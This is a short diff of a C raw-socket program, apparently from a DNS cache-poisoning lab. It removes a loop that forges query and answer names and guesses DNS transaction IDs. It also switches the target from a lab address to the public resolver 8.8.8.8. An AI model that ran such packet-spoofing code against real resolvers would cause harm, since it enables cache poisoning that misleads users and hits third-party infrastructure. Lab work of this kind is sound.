@@ -6,7 +6,8 @@
 #include <arpa/inet.h>
 
 #define MAX_FILE_SIZE   2000
-#define TARGET_IP "10.0.2.69" 
+//#define TARGET_IP "10.0.2.69" 
+#define TARGET_IP "8.8.8.8" 
 
 int send_packet_raw (int sock, char *ip, int n);
 
@@ -27,20 +28,7 @@ int main()
   int n = fread(ip, 1, MAX_FILE_SIZE, f);
   printf("Total IP packet size: %d\n", n);
 
-  // Modify the name in the question field (offset=41)
-  memcpy(ip+41, "bbbbb" , 5); 
-  // Modify the name in the answer field (offset=64)
-  memcpy(ip+64, "bbbbb" , 5); 
-
-  for (int guess=1; guess<10; guess++){
-     // Modify the transaction ID field (offset=28)
-     unsigned short id[2];
-     *id = htons(guess);
-     memcpy(ip+28, (void *) id, 2); 
-
-     // Send the IP packet out
-     send_packet_raw(sock, ip, n);
-  }
+  send_packet_raw(sock, ip, n);
 
   close(sock);
 }
